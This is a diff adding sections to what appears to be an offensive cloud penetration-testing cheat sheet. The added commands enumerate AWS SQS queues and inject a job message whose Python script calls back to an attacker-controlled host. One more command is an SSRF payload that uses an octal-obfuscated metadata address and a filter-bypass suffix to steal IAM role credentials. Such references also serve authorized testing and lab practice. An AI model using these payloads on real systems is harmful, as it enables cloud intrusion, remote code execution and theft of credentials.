@@ -367,6 +367,40 @@ $ aws s3api get-bucket-public-access-block --bucket <BUCKET>
 $ aws s3api get-bucket-cors --bucket <BUCKET>
 ```
 
+### Simple Queue Service (SQS) Enumeration
+
+#### List Queues
+
+```console
+$ aws sqs list-queues --endpoint-url http://<RHOST> --region <REGION>
+```
+
+#### Get Queue Attributes
+
+```console
+$ aws sqs get-queue-attributes --queue-url "http://<RHOST>/<ACCOUNT>/<QUEUE>" --attribute-names All --endpoint-url http://<RHOST> --region <REGION>
+```
+
+#### Send Message
+
+```console
+$ aws sqs send-message --queue-url "http://<RHOST>/<ACCOUNT>/<QUEUE>" --message-body '{"name":"probe-job","schedule":"*/5 * * * *","runtime":"python3.11"}' --endpoint-url http://<RHOST> --region <REGION>
+```
+
+#### Send Message with Python Callback
+
+```console
+$ aws sqs send-message --queue-url "http://<RHOST>/<ACCOUNT>/<QUEUE>" --message-body '{"name":"probe-callback","schedule":"*/5 * * * *","runtime":"python3.11","script":"import urllib.request; urllib.request.urlopen(\"http://<LHOST>:<LPORT>/callback_check\")"}' --endpoint-url http://<RHOST> --region <REGION>
+```
+
+### Instance Metadata Service (IMDS) via Server-Side Request Forgery (SSRF)
+
+#### Retrieve IAM Role Credentials
+
+```console
+$ curl -s -X POST http://<RHOST>/<ENDPOINT> -d "url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/<ROLE>?a=test.yaml"
+```
+
 ### Lambda Functions Enumeration
 
 #### List Lambda Functions
